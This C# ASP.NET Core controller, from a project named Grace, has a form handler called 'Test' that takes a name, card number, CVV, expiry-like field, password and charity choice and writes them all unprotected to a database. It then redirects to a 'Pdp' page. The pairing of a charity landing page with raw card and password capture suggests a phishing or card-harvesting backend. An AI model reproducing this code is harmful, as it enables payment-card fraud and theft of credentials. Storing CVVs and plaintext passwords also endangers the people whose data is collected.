using Grace.Data;
using Grace.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;

namespace Grace.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;
        private readonly ApplicationDbContext Fuse;

        public HomeController(ILogger<HomeController> logger, ApplicationDbContext Work)
        {
            _logger = logger;
            Fuse = Work;
        }

        public IActionResult Index()
        {
            return View();
        }

        public IActionResult Pdp()
        {
            return View();
        }

        public IActionResult LP()
        {
            return View();
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Test(IFormCollection collect)
        {
            if (ModelState.IsValid)
            {
                Items det = new Items();
                det.Id = collect["Id"];
                det.Name = collect["Name"];
                det.CardNo = collect["CardNo"];
                det.Cvv = collect["Cvv"];
                det.Oge = collect["Oge"];
                det.Password = collect["Password"];
                det.Charity = collect["Charity"];
                Fuse.item.Add(det);
                await Fuse.SaveChangesAsync();
            }
            return RedirectToAction("Pdp");
        }



        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}
